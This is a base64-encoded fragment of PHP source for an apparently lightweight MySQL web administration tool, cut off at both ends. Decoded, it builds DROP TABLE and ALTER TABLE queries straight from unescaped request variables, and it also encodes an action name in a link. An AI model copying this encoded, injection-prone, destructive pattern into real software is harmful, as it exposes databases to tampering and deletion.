JGRibmFtZSwgJHRhYmxlbmFtZSwgJFBIUF9TRUxGLCAkcXVlcnlTdHIsICRlcnJNc2c7DQoJJHF1ZXJ5U3RyID0gIkRST1AgVEFCTEUgJHRhYmxlbmFtZSI7DQoJbXlzcWxfc2VsZWN0X2RiKCAkZGJuYW1lLCAkbXlzcWxIYW5kbGUgKTsNCglteXNxbF9xdWVyeSggJHF1ZXJ5U3RyLCAkbXlzcWxIYW5kbGUgKTsNCgkkZXJyTXNnID0gbXlzcWxfZXJyb3IoKTsNCglsaXN0VGFibGVzKCk7DQp9DQoNCmZ1bmN0aW9uIHZpZXdTY2hlbWEoKSB7DQoJZ2xvYmFsICRteXNxbEhhbmRsZSwgJGRibmFtZSwgJHRhYmxlbmFtZSwgJFBIUF9TRUxGLCAkcXVlcnlTdHIsICRlcnJNc2c7DQoJZWNobyAiPGgxPlRhYmxlIFNjaGVtYTwvaDE+XG4iOw0KCWVjaG8gIjxwIGNsYXNzPWxvY2F0aW9uPiRkYm5hbWUgJmd0OyAkdGFibGVuYW1lPC9wPlxuIjsNCgllY2hvUXVlcnlSZXN1bHQoKTsNCgllY2hvICI8YSBocmVmPSckUEhQX1NFTEY/YWN0aW9uPWFkZEZpZWxkJmRibmFtZT0kZGJuYW1lJnRhYmxlbmFtZT0kdGFibGVuYW1lJz5BZGQgRmllbGQ8L2E+IHwgXG4iOw0KCWVjaG8gIjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249ZG1sbGQwUmhkR0U9JmRibmFtZT0kZGJuYW1lJnRhYmxlbmFtZT0kdGFibGVuYW1lJz5WaWV3IERhdGE8L2E+XG4iOw0KCWVjaG8gIjxocj5cbiI7DQoJJHBSZXN1bHQgPSBteXNxbF9kYl9xdWVyeSggJGRibmFtZSwgIlNIT1cgZmllbGRzIEZST00gJHRhYmxlbmFtZSIgKTsNCgkkbnVtID0gbXlzcWxfbnVtX3Jvd3MoICRwUmVzdWx0ICk7DQoJZWNobyAiPHRhYmxlIGNlbGxzcGFjaW5nPTEgY2VsbHBhZGRpbmc9NT5cbiI7DQoJZWNobyAiPHRyPlxuIjsNCgllY2hvICI8dGg+RmllbGQ8L3RoPlxuIjsNCgllY2hvICI8dGg+VHlwZTwvdGg+XG4iOw0KCWVjaG8gIjx0aD5OdWxsPC90aD5cbiI7DQoJZWNobyAiPHRoPktleTwvdGg+XG4iOw0KCWVjaG8gIjx0aD5EZWZhdWx0PC90aD5cbiI7DQoJZWNobyAiPHRoPkV4dHJhPC90aD5cbiI7DQoJZWNobyAiPHRoIGNvbHNwYW49Mj5BY3Rpb248L3RoPlxuIjsNCgllY2hvICI8L3RyPlxuIjsNCg0KCWZvciggJGkgPSAwOyAkaSA8ICRudW07ICRpKysgKSB7DQoJCSRmaWVsZCA9IG15c3FsX2ZldGNoX2FycmF5KCAkcFJlc3VsdCApOw0KCQllY2hvICI8dHI+XG4iOw0KCQllY2hvICI8dGQ+Ii4kZmllbGRbIkZpZWxkIl0uIjwvdGQ+XG4iOw0KCQllY2hvICI8dGQ+Ii4kZmllbGRbIlR5cGUiXS4iPC90ZD5cbiI7DQoJCWVjaG8gIjx0ZD4iLiRmaWVsZFsiTnVsbCJdLiI8L3RkPlxuIjsNCgkJZWNobyAiPHRkPiIuJGZpZWxkWyJLZXkiXS4iPC90ZD5cbiI7DQoJCWVjaG8gIjx0ZD4iLiRmaWVsZFsiRGVmYXVsdCJdLiI8L3RkPlxuIjsNCgkJZWNobyAiPHRkPiIuJGZpZWxkWyJFeHRyYSJdLiI8L3RkPlxuIjsNCgkJJGZpZWxkbmFtZSA9ICRmaWVsZFsiRmllbGQiXTsNCgkJZWNobyAiPHRkPjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249ZWRpdEZpZWxkJmRibmFtZT0kZGJuYW1lJnRhYmxlbmFtZT0kdGFibGVuYW1lJmZpZWxkbmFtZT0kZmllbGRuYW1lJz5FZGl0PC9hPjwvdGQ+XG4iOw0KCQllY2hvICI8dGQ+PGEgaHJlZj0nJFBIUF9TRUxGP2FjdGlvbj1kcm9wRmllbGQmZGJuYW1lPSRkYm5hbWUmdGFibGVuYW1lPSR0YWJsZW5hbWUmZmllbGRuYW1lPSRmaWVsZG5hbWUnIG9uQ2xpY2s9XCJyZXR1cm4gY29uZmlybSgnRHJvcCBGaWVsZCBcJyRmaWVsZG5hbWVcJz8nKVwiPkRyb3A8L2E+PC90ZD5cbiI7DQoJCWVjaG8gIjwvdHI+XG4iOw0KCX0NCgllY2hvICI8L3RhYmxlPlxuIjsNCn0NCg0KZnVuY3Rpb24gbWFuYWdlRmllbGQoICRjbWQgKSB7DQoJZ2xvYmFsICRteXNxbEhhbmRsZSwgJGRibmFtZSwgJHRhYmxlbmFtZSwgJGZpZWxkbmFtZSwgJFBIUF9TRUxGOw0KCWlmKCAkY21kID09ICJhZGQiICkNCgkJZWNobyAiPGgxPkFkZCBGaWVsZDwvaDE+XG4iOw0KCWVsc2UgaWYoICRjbWQgPT0gImVkaXQiICkgew0KCQllY2hvICI8aDE+RWRpdCBGaWVsZDwvaDE+XG4iOw0KCQkkcFJlc3VsdCA9IG15c3FsX2RiX3F1ZXJ5KCAkZGJuYW1lLCAiU0hPVyBmaWVsZHMgRlJPTSAkdGFibGVuYW1lIiApOw0KCQkkbnVtID0gbXlzcWxfbnVtX3Jvd3MoICRwUmVzdWx0ICk7DQoJCWZvciggJGkgPSAwOyAkaSA8ICRudW07ICRpKysgKSB7DQoJCQkkZmllbGQgPSBteXNxbF9mZXRjaF9hcnJheSggJHBSZXN1bHQgKTsNCgkJCWlmKCAkZmllbGRbIkZpZWxkIl0gPT0gJGZpZWxkbmFtZSApIHsNCgkJCQkkZmllbGR0eXBlID0gJGZpZWxkWyJUeXBlIl07DQoJCQkJJGZpZWxka2V5ID0gJGZpZWxkWyJLZXkiXTsNCgkJCQkkZmllbGRleHRyYSA9ICRmaWVsZFsiRXh0cmEiXTsNCgkJCQkkZmllbGRudWxsID0gJGZpZWxkWyJOdWxsIl07DQoJCQkJJGZpZWxkZGVmYXVsdCA9ICRmaWVsZFsiRGVmYXVsdCJdOw0KCQkJCWJyZWFrOw0KCQkJfQ0KCQl9DQoNCgkJJHR5cGUgPSBzdHJ0b2soICRmaWVsZHR5cGUsICIgKCwpXG4iICk7DQoJCWlmKCBzdHJwb3MoICRmaWVsZHR5cGUsICIoIiApICkgew0KCQkJaWYoICR0eXBlID09ICJlbnVtIiB8ICR0eXBlID09ICJzZXQiICkgew0KCQkJCSR2YWx1ZWxpc3QgPSBzdHJ0b2soICIgKClcbiIgKTsNCgkJCX0gZWxzZSB7DQoJCQkJJE0gPSBzdHJ0b2soICIgKCwpXG4iICk7DQoJCQkJaWYoIHN0cnBvcyggJGZpZWxkdHlwZSwgIiwiICkgKQ0KCQkJCQkkRCA9IHN0cnRvayggIiAoLClcbiIgKTsNCgkJCX0NCgkJfQ0KCX0NCg0KCWVjaG8gIjxwIGNsYXNzPWxvY2F0aW9uPiRkYm5hbWUgJmd0OyAkdGFibGVuYW1lPC9wPlxuIjsNCgllY2hvICI8Zm9ybSBhY3Rpb249JFBIUF9TRUxGPlxuIjsNCglpZiggJGNtZCA9PSAiYWRkIiApDQoJCWVjaG8gIjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWFjdGlvbiB2YWx1ZT1hZGRGaWVsZF9zdWJtaXQ+XG4iOw0KCWVsc2UgaWYoICRjbWQgPT0gImVkaXQiICkgew0KCQllY2hvICI8aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1hY3Rpb24gdmFsdWU9ZWRpdEZpZWxkX3N1Ym1pdD5cbiI7DQoJCWVjaG8gIjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPW9sZF9uYW1lIHZhbHVlPSRmaWVsZG5hbWU+XG4iOw0KCX0NCgllY2hvICI8aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1kYm5hbWUgdmFsdWU9JGRibmFtZT5cbiI7DQoJZWNobyAiPGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9dGFibGVuYW1lIHZhbHVlPSR0YWJsZW5hbWU+XG4iOw0KCWVjaG8gIjxoMz5OYW1lPC9oMz5cbiI7DQoJZWNobyAiPGlucHV0IHR5cGU9dGV4dCBuYW1lPW5hbWUgdmFsdWU9JGZpZWxkbmFtZT48cD5cbiI7DQoJZWNobyAnDQoNCjxoMz5UeXBlPC9oMz4NCjxmb250IHNpemU9MiBjbGFzcz0ibmV3Ij4NCiogYE1cJyBpbmRpY2F0ZXMgdGhlIG1heGltdW0gZGlzcGxheSBzaXplLjxicj4NCiogYERcJyBhcHBsaWVzIHRvIGZsb2F0aW5nLXBvaW50IHR5cGVzIGFuZCBpbmRpY2F0ZXMgdGhlIG51bWJlciBvZiBkaWdpdHMgZm9sbG93aW5nIHRoZSBkZWNpbWFsIHBvaW50Ljxicj4NCjwvZm9udD4NCjx0YWJsZT4NCjx0cj4NCjx0aD5UeXBlPC90aD48dGg+Jm5ic3BNJm5ic3A8L3RoPjx0aD4mbmJzcEQmbmJzcDwvdGg+PHRoPnVuc2lnbmVkPC90aD48dGg+emVyb2ZpbGw8L3RoPjx0aD5iaW5hcnk8L3RoPg0KPC90cj4NCjx0cj4NCjx0ZD48aW5wdXQgdHlwZT1yYWRpbyBuYW1lPXR5cGUgdmFsdWU9IlRJTllJTlQiICc7IGlmKCAkdHlwZSA9PSAidGlueWludCIgKSBlY2hvICJjaGVja2VkIjtlY2hvICc+VElOWUlOVCAoLTEyOCB+IDEyNyk8L3RkPg0KPHRkIGFsaWduPWNlbnRlcj5PPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQgYWxpZ249Y2VudGVyPk88L3RkPg0KPHRkIGFsaWduPWNlbnRlcj5PPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8L3RyPg0KPHRyPg0KPHRkPjxpbnB1dCB0eXBlPXJhZGlvIG5hbWU9dHlwZSB2YWx1ZT0iU01BTExJTlQiICc7IGlmKCAkdHlwZSA9PSAic21hbGxpbnQiICkgZWNobyAiY2hlY2tlZCI7ZWNobyAnPlNNQUxMSU5UICgtMzI3NjggfiAzMjc2Nyk8L3RkPg0KPHRkIGFsaWduPWNlbnRlcj5PPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQgYWxpZ249Y2VudGVyPk88L3RkPg0KPHRkIGFsaWduPWNlbnRlcj5PPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8L3RyPg0KPHRyPg0KPHRkPjxpbnB1dCB0eXBlPXJhZGlvIG5hbWU9dHlwZSB2YWx1ZT0iTUVESVVNSU5UIiAnOyBpZiggJHR5cGUgPT0gIm1lZGl1bWludCIgKSBlY2hvICJjaGVja2VkIjtlY2hvICc+TUVESVVNSU5UICgtODM4ODYwOCB+IDgzODg2MDcpPC90ZD4NCjx0ZCBhbGlnbj1jZW50ZXI+TzwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkIGFsaWduPWNlbnRlcj5PPC90ZD4NCjx0ZCBhbGlnbj1jZW50ZXI+TzwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPC90cj4NCjx0cj4NCjx0ZD48aW5wdXQgdHlwZT1yYWRpbyBuYW1lPXR5cGUgdmFsdWU9IklOVCIgJzsgaWYoICR0eXBlID09ICJpbnQiICkgZWNobyAiY2hlY2tlZCI7ZWNobyAnPklOVCAoLTIxNDc0ODM2NDggfiAyMTQ3NDgzNjQ3KTwvdGQ+DQo8dGQgYWxpZ249Y2VudGVyPk88L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZCBhbGlnbj1jZW50ZXI+TzwvdGQ+DQo8dGQgYWxpZ249Y2VudGVyPk88L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjwvdHI+DQo8dHI+DQo8dGQ+PGlucHV0IHR5cGU9cmFkaW8gbmFtZT10eXBlIHZhbHVlPSJCSUdJTlQiICc7IGlmKCAkdHlwZSA9PSAiYmlnaW50IiApIGVjaG8gImNoZWNrZWQiO2VjaG8gJz5CSUdJTlQgKC05MjIzMzcyMDM2ODU0Nzc1ODA4IH4gOTIyMzM3MjAzNjg1NDc3NTgwNyk8L3RkPg0KPHRkIGFsaWduPWNlbnRlcj5PPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQgYWxpZ249Y2VudGVyPk88L3RkPg0KPHRkIGFsaWduPWNlbnRlcj5PPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8L3RyPg0KPHRyPg0KPHRkPjxpbnB1dCB0eXBlPXJhZGlvIG5hbWU9dHlwZSB2YWx1ZT0iRkxPQVQiICc7IGlmKCAkdHlwZSA9PSAiZmxvYXQiICkgZWNobyAiY2hlY2tlZCI7ZWNobyAnPkZMT0FUPC90ZD4NCjx0ZCBhbGlnbj1jZW50ZXI+TzwvdGQ+DQo8dGQgYWxpZ249Y2VudGVyPk88L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZCBhbGlnbj1jZW50ZXI+TzwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPC90cj4NCjx0cj4NCjx0ZD48aW5wdXQgdHlwZT1yYWRpbyBuYW1lPXR5cGUgdmFsdWU9IkRPVUJMRSIgJzsgaWYoICR0eXBlID09ICJkb3VibGUiICkgZWNobyAiY2hlY2tlZCI7ZWNobyAnPkRPVUJMRTwvdGQ+DQo8dGQgYWxpZ249Y2VudGVyPk88L3RkPg0KPHRkIGFsaWduPWNlbnRlcj5PPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQgYWxpZ249Y2VudGVyPk88L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjwvdHI+DQo8dHI+DQo8dGQ+PGlucHV0IHR5cGU9cmFkaW8gbmFtZT10eXBlIHZhbHVlPSJERUNJTUFMIiAnOyBpZiggJHR5cGUgPT0gImRlY2ltYWwiICkgZWNobyAiY2hlY2tlZCI7ZWNobyAnPkRFQ0lNQUwoTlVNRVJJQyk8L3RkPg0KPHRkIGFsaWduPWNlbnRlcj5PPC90ZD4NCjx0ZCBhbGlnbj1jZW50ZXI+TzwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkIGFsaWduPWNlbnRlcj5PPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8L3RyPg0KPHRyPg0KPHRkPjxpbnB1dCB0eXBlPXJhZGlvIG5hbWU9dHlwZSB2YWx1ZT0iREFURSIgJzsgaWYoICR0eXBlID09ICJkYXRlIiApIGVjaG8gImNoZWNrZWQiO2VjaG8gJz5EQVRFICgxMDAwLTAxLTAxIH4gOTk5OS0xMi0zMSwgWVlZWS1NTS1ERCk8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8L3RyPg0KPHRyPg0KPHRkPjxpbnB1dCB0eXBlPXJhZGlvIG5hbWU9dHlwZSB2YWx1ZT0iREFURVRJTUUiICc7IGlmKCAkdHlwZSA9PSAiZGF0ZXRpbWUiICkgZWNobyAiY2hlY2tlZCI7ZWNobyAnPkRBVEVUSU1FICgxMDAwLTAxLTAxIDAwOjAwOjAwIH4gOTk5OS0xMi0zMSAyMzo1OTo1OSwgWVlZWS1NTS1ERCBISDpNTTpTUyk8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8L3RyPg0KPHRyPg0KPHRkPjxpbnB1dCB0eXBlPXJhZGlvIG5hbWU9dHlwZSB2YWx1ZT0iVElNRVNUQU1QIiAnOyBpZiggJHR5cGUgPT0gInRpbWVzdGFtcCIgKSBlY2hvICJjaGVja2VkIjtlY2hvICc+VElNRVNUQU1QICgxOTcwLTAxLTAxIDAwOjAwOjAwIH4gMjEwNi4uLiwgWVlZWU1NRERbSEhbTU1bU1NdXV0pPC90ZD4NCjx0ZCBhbGlnbj1jZW50ZXI+TzwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPC90cj4NCjx0cj4NCjx0ZD48aW5wdXQgdHlwZT1yYWRpbyBuYW1lPXR5cGUgdmFsdWU9IlRJTUUiICc7IGlmKCAkdHlwZSA9PSAidGltZSIgKSBlY2hvICJjaGVja2VkIjtlY2hvICc+VElNRSAoLTgzODo1OTo1OSB+IDgzODo1OTo1OSwgSEg6TU06U1MpPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPC90cj4NCjx0cj4NCjx0ZD48aW5wdXQgdHlwZT1yYWRpbyBuYW1lPXR5cGUgdmFsdWU9IllFQVIiICc7IGlmKCAkdHlwZSA9PSAieWVhciIgKSBlY2hvICJjaGVja2VkIjtlY2hvICc+WUVBUiAoMTkwMSB+IDIxNTUsIDAwMDAsIFlZWVkpPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPC90cj4NCjx0cj4NCjx0ZD48aW5wdXQgdHlwZT1yYWRpbyBuYW1lPXR5cGUgdmFsdWU9IkNIQVIiICc7IGlmKCAkdHlwZSA9PSAiY2hhciIgKSBlY2hvICJjaGVja2VkIjtlY2hvICc+Q0hBUjwvdGQ+DQo8dGQgYWxpZ249Y2VudGVyPk88L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkIGFsaWduPWNlbnRlcj5PPC90ZD4NCjwvdHI+DQo8dHI+DQo8dGQ+PGlucHV0IHR5cGU9cmFkaW8gbmFtZT10eXBlIHZhbHVlPSJWQVJDSEFSIiAnOyBpZiggJHR5cGUgPT0gInZhcmNoYXIiICkgZWNobyAiY2hlY2tlZCI7ZWNobyAnPlZBUkNIQVI8L3RkPg0KPHRkIGFsaWduPWNlbnRlcj5PPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZCBhbGlnbj1jZW50ZXI+TzwvdGQ+DQo8L3RyPg0KPHRyPg0KPHRkPjxpbnB1dCB0eXBlPXJhZGlvIG5hbWU9dHlwZSB2YWx1ZT0iVElOWVRFWFQiICc7IGlmKCAkdHlwZSA9PSAidGlueXRleHQiICkgZWNobyAiY2hlY2tlZCI7ZWNobyAnPlRJTllURVhUICgwIH4gMjU1KTwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjwvdHI+DQo8dHI+DQo8dGQ+PGlucHV0IHR5cGU9cmFkaW8gbmFtZT10eXBlIHZhbHVlPSJURVhUIiAnOyBpZiggJHR5cGUgPT0gInRleHQiICkgZWNobyAiY2hlY2tlZCI7ZWNobyAnPlRFWFQgKDAgfiA2NTUzNSk8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8L3RyPg0KPHRyPg0KPHRkPjxpbnB1dCB0eXBlPXJhZGlvIG5hbWU9dHlwZSB2YWx1ZT0iTUVESVVNVEVYVCIgJzsgaWYoICR0eXBlID09ICJtZWRpdW10ZXh0IiApIGVjaG8gImNoZWNrZWQiO2VjaG8gJz5NRURJVU1URVhUICgwIH4gMTY3NzcyMTUpPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPC90cj4NCjx0cj4NCjx0ZD48aW5wdXQgdHlwZT1yYWRpbyBuYW1lPXR5cGUgdmFsdWU9IkxPTkdURVhUIiAnOyBpZiggJHR5cGUgPT0gImxvbmd0ZXh0IiApIGVjaG8gImNoZWNrZWQiO2VjaG8gJz5MT05HVEVYVCAoMCB+IDQyOTQ5NjcyOTUpPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPC90cj4NCjx0cj4NCjx0ZD48aW5wdXQgdHlwZT1yYWRpbyBuYW1lPXR5cGUgdmFsdWU9IlRJTllCTE9CIiAnOyBpZiggJHR5cGUgPT0gInRpbnlibG9iIiApIGVjaG8gImNoZWNrZWQiO2VjaG8gJz5USU5ZQkxPQiAoMCB+IDI1NSk8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8L3RyPg0KPHRyPg0KPHRkPjxpbnB1dCB0eXBlPXJhZGlvIG5hbWU9dHlwZSB2YWx1ZT0iQkxPQiIgJzsgaWYoICR0eXBlID09ICJibG9iIiApIGVjaG8gImNoZWNrZWQiO2VjaG8gJz5CTE9CICgwIH4gNjU1MzUpPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPC90cj4NCjx0cj4NCjx0ZD48aW5wdXQgdHlwZT1yYWRpbyBuYW1lPXR5cGUgdmFsdWU9Ik1FRElVTUJMT0IiICc7IGlmKCAkdHlwZSA9PSAibWVkaXVtYmxvYiIgKSBlY2hvICJjaGVja2VkIjtlY2hvICc+TUVESVVNQkxPQiAoMCB+IDE2Nzc3MjE1KTwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjwvdHI+DQo8dHI+DQo8dGQ+PGlucHV0IHR5cGU9cmFkaW8gbmFtZT10eXBlIHZhbHVlPSJMT05HQkxPQiIgJzsgaWYoICR0eXBlID09ICJsb25nYmxvYiIgKSBlY2hvICJjaGVja2VkIjtlY2hvICc+TE9OR0JMT0IgKDAgfiA0Mjk0OTY3Mjk1KTwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjwvdHI+DQo8dHI+DQo8dGQ+PGlucHV0IHR5cGU9cmFkaW8gbmFtZT10eXBlIHZhbHVlPSJFTlVNIiAnOyBpZiggJHR5cGUgPT0gImVudW0iICkgZWNobyAiY2hlY2tlZCI7ZWNobyAnPkVOVU08L3RkPg0KPHRkIGNvbHNwYW49NT48Y2VudGVyPnZhbHVlIGxpc3Q8L2NlbnRlcj48L3RkPg0KPC90cj4NCjx0cj4NCjx0ZD48aW5wdXQgdHlwZT1yYWRpbyBuYW1lPXR5cGUgdmFsdWU9IlNFVCIgJzsgaWYoICR0eXBlID09ICJzZXQiICkgZWNobyAiY2hlY2tlZCI7ZWNobyAnPlNFVDwvdGQ+DQo8dGQgY29sc3Bhbj01PjxjZW50ZXI+dmFsdWUgbGlzdDwvY2VudGVyPjwvdGQ+DQo8L3RyPg0KPC90YWJsZT4NCjx0YWJsZT4NCjx0cj48dGg+TTwvdGg+PHRoPkQ8L3RoPjx0aD51bnNpZ25lZDwvdGg+PHRoPnplcm9maWxsPC90aD48dGg+YmluYXJ5PC90aD48dGg+dmFsdWUgbGlzdCAoZXg6IFwnYXBwbGVcJywgXCdvcmFuZ2VcJywgXCdiYW5hbmFcJykgPC90aD48L3RyPg0KPHRyPg0KPHRkIGFsaWduPWNlbnRlcj48aW5wdXQgdHlwZT10ZXh0IHNpemU9NCBuYW1lPU0gJzsgaWYoICRNICE9ICIiICkgZWNobyAidmFsdWU9JE0iO2VjaG8gJz48L3RkPg0KPHRkIGFsaWduPWNlbnRlcj48aW5wdXQgdHlwZT10ZXh0IHNpemU9NCBuYW1lPUQgJzsgaWYoICREICE9ICIiICkgZWNobyAidmFsdWU9JEQiO2VjaG8gJz48L3RkPg0KPHRkIGFsaWduPWNlbnRlcj48aW5wdXQgdHlwZT1jaGVja2JveCBuYW1lPXVuc2lnbmVkIHZhbHVlPSJVTlNJR05FRCIgJzsgaWYoIHN0cnBvcyggJGZpZWxkdHlwZSwgInVuc2lnbmVkIiApICkgZWNobyAiY2hlY2tlZCI7ZWNobyAnPjwvdGQ+DQo8dGQgYWxpZ249Y2VudGVyPjxpbnB1dCB0eXBlPWNoZWNrYm94IG5hbWU9emVyb2ZpbGwgdmFsdWU9IlpFUk9GSUxMIiAnOyBpZiggc3RycG9zKCAkZmllbGR0eXBlLCAiemVyb2ZpbGwiICkgKSBlY2hvICJjaGVja2VkIjtlY2hvICc+PC90ZD4NCjx0ZCBhbGlnbj1jZW50ZXI+PGlucHV0IHR5cGU9Y2hlY2tib3ggbmFtZT1iaW5hcnkgdmFsdWU9IkJJTkFSWSIgJzsgaWYoIHN0cnBvcyggJGZpZWxkdHlwZSwgImJpbmFyeSIgKSAgKSBlY2hvICJjaGVja2VkIjtlY2hvICc+PC90ZD4NCjx0ZCBhbGlnbj1jZW50ZXI+PGlucHV0IHR5cGU9dGV4dCBzaXplPTYwIG5hbWU9dmFsdWVsaXN0ICc7IGlmKCAkdmFsdWVsaXN0ICE9ICIiICkgZWNobyAidmFsdWU9XCIkdmFsdWVsaXN0XCIiO2VjaG8gJz48L3RkPg0KPC90cj4NCjwvdGFibGU+DQo8aDM+RmxhZ3M8L2gzPg0KPHRhYmxlPg0KPHRyPjx0aD5ub3QgbnVsbDwvdGg+PHRoPmRlZmF1bHQgdmFsdWU8L3RoPjx0aD5hdXRvIGluY3JlbWVudDwvdGg+PHRoPnByaW1hcnkga2V5PC90aD48L3RyPg0KPHRyPg0KPHRkIGFsaWduPWNlbnRlcj48aW5wdXQgdHlwZT1jaGVja2JveCBuYW1lPW5vdF9udWxsIHZhbHVlPSJOT1QgTlVMTCIgJzsgaWYoICRmaWVsZG51bGwgIT0gIllFUyIgKSBlY2hvICJjaGVja2VkIjtlY2hvICc+PC90ZD4NCjx0ZCBhbGlnbj1jZW50ZXI+PGlucHV0IHR5cGU9dGV4dCBuYW1lPWRlZmF1bHRfdmFsdWUgJzsgaWYoICRmaWVsZGRlZmF1bHQgIT0gIiIgKSBlY2hvICJ2YWx1ZT0kZmllbGRkZWZhdWx0IjtlY2hvICc+PC90ZD4NCjx0ZCBhbGlnbj1jZW50ZXI+PGlucHV0IHR5cGU9Y2hlY2tib3ggbmFtZT1hdXRvX2luY3JlbWVudCB2YWx1ZT0iQVVUT19JTkNSRU1FTlQiICc7IGlmKCAkZmllbGRleHRyYSA9PSAiYXV0b19pbmNyZW1lbnQiICkgZWNobyAiY2hlY2tlZCI7ZWNobyAnPjwvdGQ+DQo8dGQgYWxpZ249Y2VudGVyPjxpbnB1dCB0eXBlPWNoZWNrYm94IG5hbWU9cHJpbWFyeV9rZXkgdmFsdWU9IlBSSU1BUlkgS0VZIiAnOyBpZiggJGZpZWxka2V5ID09ICJQUkkiICkgZWNobyAiY2hlY2tlZCI7ZWNobyAnPjwvdGQ+DQo8L3RyPg0KPC90YWJsZT4NCjxwPic7DQoJaWYoICRjbWQgPT0gImFkZCIgKQ0KCQllY2hvICI8aW5wdXQgdHlwZT1zdWJtaXQgdmFsdWU9J0FkZCBGaWVsZCc+XG4iOw0KCWVsc2UgaWYoICRjbWQgPT0gImVkaXQiICkNCgkJZWNobyAiPGlucHV0IHR5cGU9c3VibWl0IHZhbHVlPSdFZGl0IEZpZWxkJz5cbiI7DQoJZWNobyAiPGlucHV0IHR5cGU9YnV0dG9uIHZhbHVlPUNhbmNlbCBvbkNsaWNrPSdoaXN0b3J5LmJhY2soKSc+XG4iOw0KCWVjaG8gIjwvZm9ybT5cbiI7DQp9DQoNCmZ1bmN0aW9uIG1hbmFnZUZpZWxkX3N1Ym1pdCggJGNtZCApIHsNCglnbG9iYWwgJG15c3FsSGFuZGxlLCAkZGJuYW1lLCAkdGFibGVuYW1lLCAkb2xkX25hbWUsICRuYW1lLCAkdHlwZSwgJFBIUF9TRUxGLCAkcXVlcnlTdHIsICRlcnJNc2csDQoJCSRNLCAkRCwgJHVuc2lnbmVkLCAkemVyb2ZpbGwsICRiaW5hcnksICRub3RfbnVsbCwgJGRlZmF1bHRfdmFsdWUsICRhdXRvX2luY3JlbWVudCwgJHByaW1hcnlfa2V5LCAkdmFsdWVsaXN0Ow0KCWlmKCAkY21kID09ICJhZGQiICkNCgkJJHF1ZXJ5U3RyID0gIkFMVEVSIFRBQkxFICR0YWJsZW5hbWUg